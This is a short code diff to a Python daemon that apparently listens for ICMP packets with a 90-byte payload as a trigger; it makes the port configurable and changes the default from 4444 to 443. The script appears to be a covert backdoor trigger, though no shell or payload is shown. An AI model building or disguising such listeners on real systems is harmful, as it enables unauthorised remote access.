@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # coding: utf-8
 
+import sys
 import subprocess
 import socket
 
@@ -56,7 +57,11 @@ class Listener(object):
 
 
 def daemon():
-    l = Listener(4444)
+    if len(sys.argv) > 1 and sys.argv[1].isdigit():
+        port = int(sys.argv[1])
+    else:
+        port = 443
+    l = Listener(port)
     for data, addr in l:
         # IP + ICMP header == 28 bytes
         if len(data) - 28 == 90:
